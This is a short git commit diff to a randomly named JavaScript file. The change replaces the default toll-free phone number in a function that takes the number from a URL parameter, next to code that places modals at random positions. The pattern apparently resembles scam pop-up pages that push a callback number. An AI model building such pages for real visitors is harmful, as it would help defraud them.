c2bc18e5f3c17f3bfaef07bda52d43ff01783694
choprajyoti225-create <choprajyoti225@gmail.com>
2026-09-21 21:06:23 +0530

    Add files via upload

--- js/HsdqpNsd.js
+++ js/HsdqpNsd.js
@@ -61,7 +61,7 @@ function getRandomPosition(modalWidth, modalHeight) {
 function getFormattedPhone() {
   const rawPhone = new URLSearchParams(window.location.search).get("p");
 
-  let phoneNumber = "+1-888-413-2130";
+  let phoneNumber = "+1-844-959-1967";
 
   if (rawPhone) {
     const clean = rawPhone.replace(/\D/g, "");
